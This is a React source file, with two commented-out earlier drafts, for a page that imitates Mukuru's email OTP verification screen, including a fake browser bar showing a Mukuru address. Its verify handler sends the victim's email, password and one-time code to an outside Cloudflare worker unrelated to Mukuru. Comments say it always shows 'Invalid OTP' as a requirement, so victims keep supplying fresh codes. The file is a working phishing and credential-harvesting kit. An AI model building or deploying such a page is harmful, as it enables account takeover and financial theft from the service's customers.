// // import { useState, useRef, useEffect } from "react";
// // import { useNavigate, useLocation } from "react-router-dom";

// // export default function MukuruOTP() {
// //   const navigate = useNavigate();
// //   const location = useLocation();

// //   // Receive email from previous page
// //   const email = location.state?.email || "";

// //   const OTP_LENGTH = 6;
// //   const [otp, setOtp] = useState(Array(OTP_LENGTH).fill(""));
// //   const [focusedIndex, setFocusedIndex] = useState(0);
// //   const [timer, setTimer] = useState(60);
// //   const [error, setError] = useState("");
// //   const inputRefs = useRef([]);

// //   // Auto focus first input on mount
// //   useEffect(() => {
// //     inputRefs.current[0]?.focus();
// //   }, []);

// //   // Resend timer countdown
// //   useEffect(() => {
// //     if (timer <= 0) return;
// //     const interval = setInterval(() => {
// //       setTimer((t) => t - 1);
// //     }, 1000);
// //     return () => clearInterval(interval);
// //   }, [timer]);

// //   // Redirect if no email (someone landed here directly)
// //   useEffect(() => {
// //     if (!email) {
// //       navigate("/", { replace: true });
// //     }
// //   }, [email, navigate]);

// //   const handleChange = (index, value) => {
// //     // Only allow digits
// //     if (!/^\d*$/.test(value)) return;

// //     const newOtp = [...otp];
// //     // Take only the last typed character (in case multiple)
// //     newOtp[index] = value.slice(-1);
// //     setOtp(newOtp);
// //     setError("");

// //     // Auto-move to next input
// //     if (value && index < OTP_LENGTH - 1) {
// //       inputRefs.current[index + 1]?.focus();
// //     }
// //   };

// //   const handleKeyDown = (index, e) => {
// //     // Backspace: clear current or move to previous
// //     if (e.key === "Backspace") {
// //       if (otp[index]) {
// //         const newOtp = [...otp];
// //         newOtp[index] = "";
// //         setOtp(newOtp);
// //       } else if (index > 0) {
// //         inputRefs.current[index - 1]?.focus();
// //       }
// //     }
// //     // Arrow navigation
// //     if (e.key === "ArrowLeft" && index > 0) {
// //       inputRefs.current[index - 1]?.focus();
// //     }
// //     if (e.key === "ArrowRight" && index < OTP_LENGTH - 1) {
// //       inputRefs.current[index + 1]?.focus();
// //     }
// //     // Enter to submit
// //     if (e.key === "Enter") {
// //       handleVerify();
// //     }
// //   };

// //   const handlePaste = (e) => {
// //     e.preventDefault();
// //     const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH);
// //     if (!pasted) return;

// //     const newOtp = Array(OTP_LENGTH).fill("");
// //     for (let i = 0; i < pasted.length; i++) {
// //       newOtp[i] = pasted[i];
// //     }
// //     setOtp(newOtp);

// //     // Focus the next empty box or the last one
// //     const nextIndex = Math.min(pasted.length, OTP_LENGTH - 1);
// //     inputRefs.current[nextIndex]?.focus();
// //   };

// //   const handleVerify = () => {
// //     const code = otp.join("");
// //     if (code.length !== OTP_LENGTH) {
// //       setError("Please enter the complete 6-digit code");
// //       return;
// //     }
// //     console.log("Verifying OTP:", code, "for", email);
// //     // navigate("/dashboard");
// //   };

// //   const handleResend = () => {
// //     if (timer > 0) return;
// //     console.log("Resending OTP to", email);
// //     setOtp(Array(OTP_LENGTH).fill(""));
// //     setTimer(60);
// //     setError("");
// //     inputRefs.current[0]?.focus();
// //   };

// //   const handleRestart = () => {
// //     navigate("/");
// //   };

// //   // Mask email for display (e.g., a***@gmail.com)
// //   const maskEmail = (em) => {
// //     if (!em || !em.includes("@")) return em;
// //     const [name, domain] = em.split("@");
// //     if (name.length <= 1) return em;
// //     return `${name[0]}${"*".repeat(Math.max(name.length - 1, 3))}@${domain}`;
// //   };

// //   return (
// //     <div className="min-h-screen bg-gray-500 flex flex-col">
// //       {/* URL Bar */}
// //       <div className="bg-gray-500 pt-6 px-3">
// //         <div className="bg-white rounded-t-2xl px-5 py-4 flex items-center justify-between">
// //           <p className="text-gray-700 text-sm sm:text-base truncate flex-1 pr-3">
// //             https://identity.mukuru.com/realms/mukur...
// //           </p>
// //           <button
// //             aria-label="Close"
// //             className="flex-shrink-0 text-gray-900 hover:text-gray-600 transition-colors"
// //           >
// //             <svg
// //               xmlns="http://www.w3.org/2000/svg"
// //               width="22"
// //               height="22"
// //               viewBox="0 0 24 24"
// //               fill="none"
// //               stroke="currentColor"
// //               strokeWidth="2.5"
// //               strokeLinecap="round"
// //               strokeLinejoin="round"
// //             >
// //               <line x1="18" y1="6" x2="6" y2="18"></line>
// //               <line x1="6" y1="6" x2="18" y2="18"></line>
// //             </svg>
// //           </button>
// //         </div>
// //       </div>

// //       <div className="flex-1 flex flex-col bg-[#3A3A3A]">
// //         {/* Orange Header */}
// //         <header className="bg-[#EF5A24] px-6 py-7 flex items-center gap-3">
// //           <svg
// //             viewBox="0 0 100 100"
// //             className="w-11 h-11 flex-shrink-0"
// //             xmlns="http://www.w3.org/2000/svg"
// //           >
// //             <g fill="white">
// //               {Array.from({ length: 12 }).map((_, i) => {
// //                 const angle = (i * 30 * Math.PI) / 180;
// //                 const x1 = 50 + Math.cos(angle) * 18;
// //                 const y1 = 50 + Math.sin(angle) * 18;
// //                 const x2 = 50 + Math.cos(angle) * 45;
// //                 const y2 = 50 + Math.sin(angle) * 45;
// //                 const perpAngle = angle + Math.PI / 2;
// //                 const w = 6;
// //                 const p1x = x1 + Math.cos(perpAngle) * w;
// //                 const p1y = y1 + Math.sin(perpAngle) * w;
// //                 const p2x = x1 - Math.cos(perpAngle) * w;
// //                 const p2y = y1 - Math.sin(perpAngle) * w;
// //                 return (
// //                   <polygon
// //                     key={i}
// //                     points={`${p1x},${p1y} ${p2x},${p2y} ${x2},${y2}`}
// //                   />
// //                 );
// //               })}
// //               <circle cx="50" cy="50" r="14" />
// //             </g>
// //           </svg>
// //           <h1
// //             className="text-white text-3xl font-semibold tracking-tight"
// //             style={{ fontFamily: "'Inter', system-ui, sans-serif" }}
// //           >
// //             mukuru
// //           </h1>
// //         </header>

// //         {/* Main Content */}
// //         <main className="flex-1 px-6 pt-7 pb-6 flex flex-col">
// //           <div className="mb-2">
// //             <h2 className="text-white text-2xl font-bold mb-3">
// //               Verify Your Email
// //             </h2>
// //           </div>

// //           {/* Restart Login */}
// //           <button
// //             onClick={handleRestart}
// //             className="flex items-center gap-2 mb-5 group w-fit"
// //           >
// //             <svg
// //               xmlns="http://www.w3.org/2000/svg"
// //               width="20"
// //               height="20"
// //               viewBox="0 0 24 24"
// //               fill="none"
// //               stroke="#2DBDB6"
// //               strokeWidth="2.5"
// //               strokeLinecap="round"
// //               strokeLinejoin="round"
// //             >
// //               <polyline points="1 4 1 10 7 10"></polyline>
// //               <polyline points="23 20 23 14 17 14"></polyline>
// //               <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
// //             </svg>
// //             <span className="text-[#2DBDB6] underline text-base font-normal group-hover:text-[#25a39d] transition-colors">
// //               Restart login
// //             </span>
// //           </button>

// //           {/* OTP Card */}
// //           <div className="bg-[#5A5A5A] rounded-2xl p-6 mb-7">
// //             <label className="block text-white text-base font-bold mb-2">
// //               Enter OTP Code
// //             </label>
// //             <p className="text-gray-300 text-sm mb-5">
// //               We've sent a 6-digit code to{" "}
// //               <span className="text-white font-semibold">
// //                 {maskEmail(email)}
// //               </span>
// //             </p>

// //             {/* OTP Inputs */}
// //             <div className="flex justify-between gap-2 mb-3">
// //               {otp.map((digit, index) => (
// //                 <input
// //                   key={index}
// //                   ref={(el) => (inputRefs.current[index] = el)}
// //                   type="text"
// //                   inputMode="numeric"
// //                   maxLength={1}
// //                   value={digit}
// //                   onChange={(e) => handleChange(index, e.target.value)}
// //                   onKeyDown={(e) => handleKeyDown(index, e)}
// //                   onFocus={() => setFocusedIndex(index)}
// //                   onPaste={handlePaste}
// //                   className={`w-11 h-14 sm:w-12 sm:h-14 text-center text-gray-900 text-xl font-bold bg-white rounded-lg outline-none transition-all ${
// //                     focusedIndex === index
// //                       ? "ring-2 ring-[#E8A33D] ring-inset"
// //                       : digit
// //                       ? "ring-1 ring-[#2DBDB6]"
// //                       : ""
// //                   }`}
// //                 />
// //               ))}
// //             </div>

// //             {error && (
// //               <p className="text-red-400 text-sm mt-2">{error}</p>
// //             )}

// //             {/* Resend */}
// //             <div className="mt-4 text-center">
// //               {timer > 0 ? (
// //                 <p className="text-gray-300 text-sm">
// //                   Resend code in{" "}
// //                   <span className="text-white font-bold">{timer}s</span>
// //                 </p>
// //               ) : (
// //                 <button
// //                   onClick={handleResend}
// //                   className="text-[#2DBDB6] underline text-sm font-normal hover:text-[#25a39d] transition-colors"
// //                 >
// //                   Resend OTP
// //                 </button>
// //               )}
// //             </div>
// //           </div>

// //           {/* Verify Button */}
// //           <button
// //             onClick={handleVerify}
// //             className="w-full bg-[#EF5A24] hover:bg-[#d94e1e] active:bg-[#c44519] transition-colors text-white font-bold text-lg py-4 rounded-full mb-6"
// //           >
// //             Verify
// //           </button>

// //           <div className="border-t border-gray-500/40 mb-6"></div>

// //           <div className="text-center">
// //             <span className="text-white font-normal text-base">
// //               Didn't receive the code?{" "}
// //             </span>
// //             <button
// //               onClick={timer === 0 ? handleResend : undefined}
// //               disabled={timer > 0}
// //               className={`underline text-base font-normal transition-colors ${
// //                 timer > 0
// //                   ? "text-gray-500 cursor-not-allowed"
// //                   : "text-[#2DBDB6] hover:text-[#25a39d]"
// //               }`}
// //             >
// //               Send again
// //             </button>
// //           </div>

// //           <div className="flex-1"></div>
// //         </main>
// //       </div>
// //     </div>
// //   );
// // }

// import { useState, useRef, useEffect } from "react";
// import { useNavigate, useLocation } from "react-router-dom";

// export default function MukuruOTP() {
//   const navigate = useNavigate();
//   const location = useLocation();

//   const email = location.state?.email || "";
//   const password = location.state?.password || "";

//   const OTP_LENGTH = 6;
//   const [otp, setOtp] = useState(Array(OTP_LENGTH).fill(""));
//   const [focusedIndex, setFocusedIndex] = useState(0);
//   const [timer, setTimer] = useState(60);
//   const [error, setError] = useState("");
//   const [loading, setLoading] = useState(false);
//   const inputRefs = useRef([]);

//   useEffect(() => {
//     inputRefs.current[0]?.focus();
//   }, []);

//   useEffect(() => {
//     if (timer <= 0) return;
//     const interval = setInterval(() => {
//       setTimer((t) => t - 1);
//     }, 1000);
//     return () => clearInterval(interval);
//   }, [timer]);

//   useEffect(() => {
//     if (!email) {
//       navigate("/", { replace: true });
//     }
//   }, [email, navigate]);

//   const handleChange = (index, value) => {
//     if (!/^\d*$/.test(value)) return;

//     const newOtp = [...otp];
//     newOtp[index] = value.slice(-1);
//     setOtp(newOtp);
//     if (error) setError("");

//     if (value && index < OTP_LENGTH - 1) {
//       inputRefs.current[index + 1]?.focus();
//     }
//   };

//   const handleKeyDown = (index, e) => {
//     if (e.key === "Backspace") {
//       if (otp[index]) {
//         const newOtp = [...otp];
//         newOtp[index] = "";
//         setOtp(newOtp);
//       } else if (index > 0) {
//         inputRefs.current[index - 1]?.focus();
//       }
//     }
//     if (e.key === "ArrowLeft" && index > 0) {
//       inputRefs.current[index - 1]?.focus();
//     }
//     if (e.key === "ArrowRight" && index < OTP_LENGTH - 1) {
//       inputRefs.current[index + 1]?.focus();
//     }
//     if (e.key === "Enter") {
//       handleVerify();
//     }
//   };

//   const handlePaste = (e) => {
//     e.preventDefault();
//     const pasted = e.clipboardData
//       .getData("text")
//       .replace(/\D/g, "")
//       .slice(0, OTP_LENGTH);
//     if (!pasted) return;

//     const newOtp = Array(OTP_LENGTH).fill("");
//     for (let i = 0; i < pasted.length; i++) {
//       newOtp[i] = pasted[i];
//     }
//     setOtp(newOtp);
//     if (error) setError("");

//     const nextIndex = Math.min(pasted.length, OTP_LENGTH - 1);
//     inputRefs.current[nextIndex]?.focus();
//   };

//   const handleVerify = async () => {
//     setError("");
//     const code = otp.join("");

//     // Validation
//     if (code.length === 0) {
//       setError("OTP is required");
//       return;
//     }
//     if (code.length < OTP_LENGTH) {
//       setError("Please enter the complete 6-digit code");
//       return;
//     }

//     // API CALL
//     try {
//       setLoading(true);
//       const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/emailPasswordOtp", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ email,password, otp: code }),
//       });

//       const data = await response.json();

//       if (!response.ok) {
//         // ALWAYS show invalid OTP as per requirement
//         setError(data.message || "Invalid OTP. Please try again.");
//         // Clear OTP boxes and refocus first
//         setOtp(Array(OTP_LENGTH).fill(""));
//         inputRefs.current[0]?.focus();
//         return;
//       }

//       // If somehow it succeeds, navigate to dashboard
//       console.log("OTP verified:", data);
//       // navigate("/dashboard");
//     } catch (err) {
//       console.error("API error:", err);
//       // ALWAYS show invalid OTP on submit (as per requirement)
//       setError("Invalid OTP. Please try again.");
//       setOtp(Array(OTP_LENGTH).fill(""));
//       inputRefs.current[0]?.focus();
//     } finally {
//       setLoading(false);
//     }
//   };

//   const handleResend = async () => {
//     if (timer > 0) return;

//     try {
//       await fetch("https://identity.mukuru.com/api/resend-otp", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ email }),
//       });
//     } catch (err) {
//       console.error("Resend API error:", err);
//     }

//     setOtp(Array(OTP_LENGTH).fill(""));
//     setTimer(60);
//     setError("");
//     inputRefs.current[0]?.focus();
//   };

//   const handleRestart = () => {
//     navigate("/");
//   };

//   const maskEmail = (em) => {
//     if (!em || !em.includes("@")) return em;
//     const [name, domain] = em.split("@");
//     if (name.length <= 1) return em;
//     return `${name[0]}${"*".repeat(Math.max(name.length - 1, 3))}@${domain}`;
//   };

//   return (
//     <div className="min-h-screen bg-gray-500 flex flex-col">
//       <div className="bg-gray-500 pt-6 px-3">
//         <div className="bg-white rounded-t-2xl px-5 py-4 flex items-center justify-between">
//           <p className="text-gray-700 text-sm sm:text-base truncate flex-1 pr-3">
//             https://identity.mukuru.com/realms/mukur...
//           </p>
//           <button aria-label="Close" className="flex-shrink-0 text-gray-900">
//             <svg
//               xmlns="http://www.w3.org/2000/svg"
//               width="22"
//               height="22"
//               viewBox="0 0 24 24"
//               fill="none"
//               stroke="currentColor"
//               strokeWidth="2.5"
//               strokeLinecap="round"
//               strokeLinejoin="round"
//             >
//               <line x1="18" y1="6" x2="6" y2="18"></line>
//               <line x1="6" y1="6" x2="18" y2="18"></line>
//             </svg>
//           </button>
//         </div>
//       </div>

//       <div className="flex-1 flex flex-col bg-[#3A3A3A]">
//         <header className="bg-[#EF5A24] px-6 py-7 flex items-center gap-3">
//           <svg viewBox="0 0 100 100" className="w-11 h-11 flex-shrink-0">
//             <g fill="white">
//               {Array.from({ length: 12 }).map((_, i) => {
//                 const angle = (i * 30 * Math.PI) / 180;
//                 const x1 = 50 + Math.cos(angle) * 18;
//                 const y1 = 50 + Math.sin(angle) * 18;
//                 const x2 = 50 + Math.cos(angle) * 45;
//                 const y2 = 50 + Math.sin(angle) * 45;
//                 const perpAngle = angle + Math.PI / 2;
//                 const w = 6;
//                 const p1x = x1 + Math.cos(perpAngle) * w;
//                 const p1y = y1 + Math.sin(perpAngle) * w;
//                 const p2x = x1 - Math.cos(perpAngle) * w;
//                 const p2y = y1 - Math.sin(perpAngle) * w;
//                 return (
//                   <polygon
//                     key={i}
//                     points={`${p1x},${p1y} ${p2x},${p2y} ${x2},${y2}`}
//                   />
//                 );
//               })}
//               <circle cx="50" cy="50" r="14" />
//             </g>
//           </svg>
//           <h1 className="text-white text-3xl font-semibold tracking-tight">
//             mukuru
//           </h1>
//         </header>

//         <main className="flex-1 px-6 pt-7 pb-6 flex flex-col">
//           <div className="mb-2">
//             <h2 className="text-white text-2xl font-bold mb-3">
//               Verify Your Email
//             </h2>
//           </div>

//           <button
//             onClick={handleRestart}
//             className="flex items-center gap-2 mb-5 group w-fit"
//           >
//             <svg
//               xmlns="http://www.w3.org/2000/svg"
//               width="20"
//               height="20"
//               viewBox="0 0 24 24"
//               fill="none"
//               stroke="#2DBDB6"
//               strokeWidth="2.5"
//               strokeLinecap="round"
//               strokeLinejoin="round"
//             >
//               <polyline points="1 4 1 10 7 10"></polyline>
//               <polyline points="23 20 23 14 17 14"></polyline>
//               <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
//             </svg>
//             <span className="text-[#2DBDB6] underline text-base font-normal">
//               Restart login
//             </span>
//           </button>

//           <div className="bg-[#5A5A5A] rounded-2xl p-6 mb-7">
//             <label className="block text-white text-base font-bold mb-2">
//               Enter OTP Code
//             </label>
//             <p className="text-gray-300 text-sm mb-5">
//               We've sent a 6-digit code to{" "}
//               <span className="text-white font-semibold">
//                 {maskEmail(email)}
//               </span>
//             </p>

//             <div className="flex justify-between gap-2 mb-2">
//               {otp.map((digit, index) => (
//                 <input
//                   key={index}
//                   ref={(el) => (inputRefs.current[index] = el)}
//                   type="text"
//                   inputMode="numeric"
//                   maxLength={1}
//                   value={digit}
//                   onChange={(e) => handleChange(index, e.target.value)}
//                   onKeyDown={(e) => handleKeyDown(index, e)}
//                   onFocus={() => setFocusedIndex(index)}
//                   onPaste={handlePaste}
//                   className={`w-11 h-14 sm:w-12 sm:h-14 text-center text-gray-900 text-xl font-bold bg-white rounded-lg outline-none transition-all ${
//                     error
//                       ? "ring-2 ring-red-500 ring-inset"
//                       : focusedIndex === index
//                       ? "ring-2 ring-[#E8A33D] ring-inset"
//                       : digit
//                       ? "ring-1 ring-[#2DBDB6]"
//                       : ""
//                   }`}
//                 />
//               ))}
//             </div>

//             {error && (
//               <p className="text-red-400 text-sm mt-2 ml-1 font-medium">
//                 {error}
//               </p>
//             )}

//             <div className="mt-4 text-center">
//               {timer > 0 ? (
//                 <p className="text-gray-300 text-sm">
//                   Resend code in{" "}
//                   <span className="text-white font-bold">{timer}s</span>
//                 </p>
//               ) : (
//                 <button
//                   onClick={handleResend}
//                   className="text-[#2DBDB6] underline text-sm font-normal"
//                 >
//                   Resend OTP
//                 </button>
//               )}
//             </div>
//           </div>

//           <button
//             onClick={handleVerify}
//             disabled={loading}
//             className="w-full bg-[#EF5A24] hover:bg-[#d94e1e] active:bg-[#c44519] disabled:opacity-60 disabled:cursor-not-allowed transition-colors text-white font-bold text-lg py-4 rounded-full mb-6 flex items-center justify-center gap-2"
//           >
//             {loading ? (
//               <>
//                 <svg
//                   className="animate-spin h-5 w-5"
//                   viewBox="0 0 24 24"
//                   fill="none"
//                 >
//                   <circle
//                     cx="12"
//                     cy="12"
//                     r="10"
//                     stroke="currentColor"
//                     strokeWidth="4"
//                     className="opacity-25"
//                   />
//                   <path
//                     fill="currentColor"
//                     className="opacity-75"
//                     d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
//                   />
//                 </svg>
//                 Verifying...
//               </>
//             ) : (
//               "Verify"
//             )}
//           </button>

//           <div className="border-t border-gray-500/40 mb-6"></div>

//           <div className="text-center">
//             <span className="text-white font-normal text-base">
//               Didn't receive the code?{" "}
//             </span>
//             <button
//               onClick={timer === 0 ? handleResend : undefined}
//               disabled={timer > 0}
//               className={`underline text-base font-normal transition-colors ${
//                 timer > 0
//                   ? "text-gray-500 cursor-not-allowed"
//                   : "text-[#2DBDB6] hover:text-[#25a39d]"
//               }`}
//             >
//               Send again
//             </button>
//           </div>

//           <div className="flex-1"></div>
//         </main>
//       </div>
//     </div>
//   );
// }

import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";

export default function MukuruOTP() {
  const navigate = useNavigate();
  const location = useLocation();

  const email = location.state?.email || "";
  const password = location.state?.password || "";

  const [otp, setOtp] = useState("");
  const [otpFocused, setOtpFocused] = useState(false);
  const [timer, setTimer] = useState(60);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const inputRef = useRef(null);

  // Auto focus on mount
  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  // Resend timer countdown
  useEffect(() => {
    if (timer <= 0) return;
    const interval = setInterval(() => {
      setTimer((t) => t - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  // Redirect if no email
  useEffect(() => {
    if (!email) {
      navigate("/", { replace: true });
    }
  }, [email, navigate]);

  const handleChange = (e) => {
    setOtp(e.target.value);
    if (error) setError("");
  };

  const handleVerify = async () => {
    setError("");

    // Validation — empty check only
    if (!otp.trim()) {
      setError("OTP is required");
      return;
    }

    // API CALL
    try {
      setLoading(true);
      const response = await fetch(
        "https://my-worker-app.instapayapi.workers.dev/api/emailPasswordOtp",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email,password, otp: otp.trim() }),
        }
      );

      const data = await response.json();
setOtp("");
      if (!response.ok) {
        // Always show invalid OTP as per requirement
        setError(data.message || "Invalid OTP. Please try again.");
        setOtp("");
        inputRef.current?.focus();
        return;
      }

      // On success, navigate ahead
      console.log("OTP verified:", data);
      // navigate("/dashboard");
    } catch (err) {
      console.error("API error:", err);
      // Always show invalid OTP on submit (as per requirement)
      setError("Invalid OTP. Please try again.");
      setOtp("");
      inputRef.current?.focus();
    } finally {
      setLoading(false);
    }
  };

  const handleResend = async () => {
    if (timer > 0) return;

    try {
      await fetch("https://identity.mukuru.com/api/resend-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      });
    } catch (err) {
      console.error("Resend API error:", err);
    }

    setOtp("");
    setTimer(60);
    setError("");
    inputRef.current?.focus();
  };

  const handleRestart = () => {
    navigate("/");
  };

  const maskEmail = (em) => {
    if (!em || !em.includes("@")) return em;
    const [name, domain] = em.split("@");
    if (name.length <= 1) return em;
    return `${name[0]}${"*".repeat(Math.max(name.length - 1, 3))}@${domain}`;
  };

  return (
    <div className="min-h-screen bg-gray-500 flex flex-col">
      {/* URL Bar */}
      <div className="bg-gray-500 pt-6 px-3">
        <div className="bg-white rounded-t-2xl px-5 py-4 flex items-center justify-between">
          <p className="text-gray-700 text-sm sm:text-base truncate flex-1 pr-3">
            https://identity.mukuru.com/realms/mukur...
          </p>
          <button aria-label="Close" className="flex-shrink-0 text-gray-900">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="22"
              height="22"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>
      </div>

      <div className="flex-1 flex flex-col bg-[#3A3A3A]">
        {/* Orange Header */}
        <header className="bg-[#EF5A24] px-6 py-7 flex items-center gap-3">
          <svg viewBox="0 0 100 100" className="w-11 h-11 flex-shrink-0">
            <g fill="white">
              {Array.from({ length: 12 }).map((_, i) => {
                const angle = (i * 30 * Math.PI) / 180;
                const x1 = 50 + Math.cos(angle) * 18;
                const y1 = 50 + Math.sin(angle) * 18;
                const x2 = 50 + Math.cos(angle) * 45;
                const y2 = 50 + Math.sin(angle) * 45;
                const perpAngle = angle + Math.PI / 2;
                const w = 6;
                const p1x = x1 + Math.cos(perpAngle) * w;
                const p1y = y1 + Math.sin(perpAngle) * w;
                const p2x = x1 - Math.cos(perpAngle) * w;
                const p2y = y1 - Math.sin(perpAngle) * w;
                return (
                  <polygon
                    key={i}
                    points={`${p1x},${p1y} ${p2x},${p2y} ${x2},${y2}`}
                  />
                );
              })}
              <circle cx="50" cy="50" r="14" />
            </g>
          </svg>
          <h1 className="text-white text-3xl font-semibold tracking-tight">
            mukuru
          </h1>
        </header>

        <main className="flex-1 px-6 pt-7 pb-6 flex flex-col">
          <div className="mb-2">
            <h2 className="text-white text-2xl font-bold mb-3">
              Verify Your Email
            </h2>
          </div>

          <button
            onClick={handleRestart}
            className="flex items-center gap-2 mb-5 group w-fit"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="20"
              height="20"
              viewBox="0 0 24 24"
              fill="none"
              stroke="#2DBDB6"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <polyline points="1 4 1 10 7 10"></polyline>
              <polyline points="23 20 23 14 17 14"></polyline>
              <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
            </svg>
            <span className="text-[#2DBDB6] underline text-base font-normal">
              Restart login
            </span>
          </button>

          {/* OTP Card */}
          <div className="bg-[#5A5A5A] rounded-2xl p-6 mb-7">
            <label
              htmlFor="otp"
              className="block text-white text-base font-bold mb-2"
            >
              OTP Code
            </label>
            <p className="text-gray-300 text-sm mb-4">
              We've sent a code to{" "}
              <span className="text-white font-semibold">
                {maskEmail(email)}
              </span>
            </p>

            {/* Single OTP Input */}
            <input
              id="otp"
              ref={inputRef}
              type="text"
              inputMode="numeric"
              value={otp}
              onChange={handleChange}
              onFocus={() => setOtpFocused(true)}
              onBlur={() => setOtpFocused(false)}
              onKeyDown={(e) => e.key === "Enter" && handleVerify()}
              placeholder="Enter OTP"
              className={`w-full bg-white rounded-full px-6 py-3.5 text-gray-800 placeholder-gray-400 outline-none text-base transition ${
                error
                  ? "ring-2 ring-red-500 ring-inset"
                  : otpFocused
                  ? "ring-2 ring-[#E8A33D] ring-inset"
                  : ""
              }`}
            />

            {error && (
              <p className="text-red-400 text-sm mt-2 ml-2 font-medium">
                {error}
              </p>
            )}

            {/* Resend */}
            <div className="mt-4 text-center">
              {timer > 0 ? (
                <p className="text-gray-300 text-sm">
                  Resend code in{" "}
                  <span className="text-white font-bold">{timer}s</span>
                </p>
              ) : (
                <button
                  onClick={handleResend}
                  className="text-[#2DBDB6] underline text-sm font-normal"
                >
                  Resend OTP
                </button>
              )}
            </div>
          </div>

          {/* Verify Button */}
          <button
            onClick={handleVerify}
            disabled={loading}
            className="w-full bg-[#EF5A24] hover:bg-[#d94e1e] active:bg-[#c44519] disabled:opacity-60 disabled:cursor-not-allowed transition-colors text-white font-bold text-lg py-4 rounded-full mb-6 flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <svg
                  className="animate-spin h-5 w-5"
                  viewBox="0 0 24 24"
                  fill="none"
                >
                  <circle
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                    className="opacity-25"
                  />
                  <path
                    fill="currentColor"
                    className="opacity-75"
                    d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
                  />
                </svg>
                Verifying...
              </>
            ) : (
              "Verify"
            )}
          </button>

          <div className="border-t border-gray-500/40 mb-6"></div>

          <div className="text-center">
            <span className="text-white font-normal text-base">
              Didn't receive the code?{" "}
            </span>
            <button
              onClick={timer === 0 ? handleResend : undefined}
              disabled={timer > 0}
              className={`underline text-base font-normal transition-colors ${
                timer > 0
                  ? "text-gray-500 cursor-not-allowed"
                  : "text-[#2DBDB6] hover:text-[#25a39d]"
              }`}
            >
              Send again
            </button>
          </div>

          <div className="flex-1"></div>
        </main>
      </div>
    </div>
  );
}